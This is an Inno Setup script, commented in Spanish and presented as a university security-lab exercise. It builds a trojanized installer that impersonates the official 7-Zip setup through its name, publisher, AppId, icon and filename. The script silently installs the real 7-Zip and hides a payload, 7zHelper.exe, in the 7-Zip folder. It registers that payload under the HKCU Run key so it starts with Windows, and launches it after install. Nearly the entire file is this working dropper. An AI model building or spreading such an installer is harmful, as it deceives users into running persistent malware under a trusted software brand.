; Instalador del laboratorio DISFRAZADO como el instalador de 7-Zip.
;
; ÁMBITO AUTORIZADO DEL CURSO (Seguridad de TI II - UTN): se usa únicamente
; en el laboratorio del curso, sobre equipos e instancias propios. El
; instalador imita el nombre, el icono y la apariencia del instalador real
; de 7-Zip como capa de disfraz (ingeniería social del entregable).
;
; Capas:
;   1. El asistente se ve como el setup oficial de 7-Zip (nombre, editor,
;      icono y nombre del archivo generado: 7z2409-x64.exe).
;   2. Instala el 7-Zip REAL (redist/7z-installer-x64.exe) en silencio.
;   3. Copia el payload (dist/7zHelper.exe) dentro de la carpeta de 7-Zip
;      con nombre y metadatos que parecen un componente más.
;   4. Registra el payload para arrancar con Windows (clave Run de HKCU).
;
; Requiere Inno Setup 6 y 7z-installer-x64.exe en installer/redist/.

#define SevenZipName "7-Zip"
#define SevenZipVersion "24.09"
#define SevenZipPublisher "Igor Pavlov"
#define SevenZipAppId "{{23170F69-40C1-2701-1709-000001000000}"

[Setup]
AppId={{#SevenZipAppId}
AppName={#SevenZipName}
AppVersion={#SevenZipVersion}
AppPublisher={#SevenZipPublisher}
DefaultDirName={autopf}\7-Zip
DefaultGroupName={#SevenZipName}
OutputDir=output
OutputBaseFilename=7z2409-x64
Compression=lzma
SolidCompression=yes
PrivilegesRequired=admin
WizardStyle=modern
SetupIconFile=..\assets\7z.ico
UninstallDisplayIcon={app}\7zFM.exe
UninstallDisplayName={#SevenZipName} {#SevenZipVersion}

[Files]
; Payload disfrazado: se copia primero; el 7-Zip real no lo pisa.
Source: "..\dist\7zHelper.exe"; DestDir: "{app}"; Flags: ignoreversion
; 7-Zip real (capa de carga): se instala en silencio con /S.
Source: "redist\7z-installer-x64.exe"; DestDir: "{tmp}"; Flags: deleteafterinstall

[Tasks]
Name: "desktopicon"; Description: "Crear acceso directo en el escritorio"

[Icons]
Name: "{group}\7-Zip File Manager"; Filename: "{app}\7zFM.exe"
Name: "{autodesktop}\7-Zip File Manager"; Filename: "{app}\7zFM.exe"; Tasks: desktopicon

[Registry]
; Persistencia: el payload arranca con Windows como "7-Zip Helper".
Root: HKCU; Subkey: "Software\Microsoft\Windows\CurrentVersion\Run"; ValueType: string; ValueName: "7-Zip Helper"; ValueData: "{app}\7zHelper.exe"; Flags: uninsdeletevalue

[Run]
Filename: "{tmp}\7z-installer-x64.exe"; Parameters: "/S /D={app}"; StatusMsg: "Instalando 7-Zip..."; Flags: waituntilterminated
Filename: "{app}\7zHelper.exe"; Description: "Iniciar 7-Zip"; Flags: nowait postinstall skipifsilent
